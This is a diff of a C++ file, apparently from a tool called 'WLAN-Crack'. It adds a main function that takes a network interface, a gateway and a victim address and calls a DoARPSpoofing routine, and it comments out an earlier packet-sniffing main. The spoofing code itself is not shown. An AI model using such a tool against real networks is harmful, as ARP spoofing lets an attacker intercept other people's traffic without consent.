@@ -1,8 +1,20 @@
 //
 // Created by skyclad on 7/31/17.
 //
-#include "PacketSniffer.h"
+#include "WLAN-Crack.h"
 
+int main(int argc, char *argv[])
+{
+    if (argc != 4) {
+        std::cerr << "[-] Usage : " << argv[0] << " [interface] [gateway] [victim]" << std::endl;
+        return -1;
+    }
+    WLAN_CRACK::ARPPacketSender sender(argv[1], argv[2]);
+    sender.DoARPSpoofing(argv[3]);
+    return 0;
+}
+
+/*
 Tins::PacketSender sender;
 const char *CustomResponse = "Hello World";
 
@@ -42,3 +54,5 @@ int main(int argc, char *argv[])
     sniffer.StartSniffing(&PacketHandler);
     return 0;
 }
+
+ */
